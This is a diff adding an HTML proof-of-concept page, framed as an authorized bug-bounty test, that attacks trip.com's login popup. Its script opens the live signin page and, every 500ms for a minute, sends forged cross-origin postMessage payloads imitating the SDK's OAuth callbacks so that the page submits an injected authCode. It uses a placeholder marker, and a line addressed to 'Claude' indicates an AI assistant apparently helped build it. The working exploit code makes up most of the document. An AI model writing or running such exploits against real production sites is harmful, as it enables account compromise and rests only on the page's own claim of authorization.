@@ -1,0 +1,68 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>trip-pm-step1</title></head>
+<body style="font-family:system-ui;max-width:640px;margin:40px auto;line-height:1.5">
+<h2>Trip postMessage origin-check test (step 1)</h2>
+<p>Authorized bug-bounty test — HackerOne handle sshabib. Benign marker only, no real OAuth code.</p>
+<ol>
+  <li>Click <b>Open Trip login</b> — a popup opens to www.trip.com/account/signin.</li>
+  <li>In that popup, open <b>DevTools → Network</b>, tick <b>Preserve log</b>, filter for <code>authenticateTrip</code>.</li>
+  <li>Click a <b>social login</b> button in the popup (Google) so the SDK arms its message listener. A provider popup may open — you can ignore/close it.</li>
+  <li>Come back here and click <b>Fire forged message</b> (or it auto-fires 20s after you open the login).</li>
+  <li>Watch the popup's Network tab (see below).</li>
+</ol>
+
+<button id="open" style="padding:10px 16px;font-size:16px">Open Trip login</button>
+<button id="fire" style="padding:10px 16px;font-size:16px" disabled>Fire forged message</button>
+
+<pre id="log" style="background:#111;color:#0f0;padding:12px;margin-top:16px;white-space:pre-wrap"></pre>
+
+<h3>What proves the vuln</h3>
+<p>In the <b>Trip popup's</b> Network tab, look for an outbound POST to:</p>
+<pre style="background:#eee;padding:8px">gateway/api/soa2/14553/authenticateTrip</pre>
+<p>Open it → Payload/Request → find <code>Data.authCode</code>.</p>
+<ul>
+  <li><b>authCode == "STEP1_MARKER_NOT_A_REAL_CODE"</b> → PASS: the handler ingested our cross-origin message with no origin check. (Server will reject the fake code — expected.)</li>
+  <li><b>No such request / marker absent</b> → the listener wasn't armed or the handle path differs; tell Claude and we adjust the trigger.</li>
+</ul>
+
+<script>
+const HANDLE_NAME = 'triplogin';
+const MARKER = 'STEP1_MARKER_NOT_A_REAL_CODE';
+let tripWin = null;
+const log = m => { document.getElementById('log').textContent += m + '\n'; };
+
+document.getElementById('open').onclick = () => {
+  tripWin = window.open('https://www.trip.com/account/signin', HANDLE_NAME);
+  document.getElementById('fire').disabled = false;
+  log('[+] opened Trip login popup. Now: open its DevTools>Network (filter authenticateTrip), click a social button, then Fire.');
+  // auto-fire fallback after 20s in case you forget the button
+  setTimeout(() => { if (tripWin && !tripWin.closed) fire('auto-20s'); }, 20000);
+};
+
+function shoot(){
+  if (!tripWin || tripWin.closed) return false;
+  // bindPostMsgFun (popup providers): gate = tpSignalCode TRIP/CTRIP, reads .code
+  tripWin.postMessage({ tpSignalCode:'TRIP',  code:MARKER, type:'google' }, '*');
+  tripWin.postMessage({ tpSignalCode:'CTRIP', code:MARKER, type:'google' }, '*');
+  // receiveMiddlPageMessage (naver/wechat/line middle-page): reads .code/.message/.context/.token
+  tripWin.postMessage({ code:MARKER, message:'', context:'{}', token:MARKER, taskType:1 }, '*');
+  return true;
+}
+
+let sprayer = null;
+function fire(src){
+  if (!tripWin || tripWin.closed) { log('[!] popup not open'); return; }
+  if (sprayer) clearInterval(sprayer);
+  let n = 0;
+  log('[' + src + '] SPRAYING forged messages every 500ms for 60s. Click Google in the popup NOW if you have not.');
+  log('    watch the popup Network for POST .../soa2/14553/authenticateTrip with Data.authCode=="' + MARKER + '"');
+  sprayer = setInterval(() => {
+    if (!shoot() || ++n > 120) { clearInterval(sprayer); log('[*] spray done (' + n + ' rounds)'); }
+  }, 500);
+}
+
+document.getElementById('fire').onclick = () => fire('manual');
+</script>
+</body>
+</html>
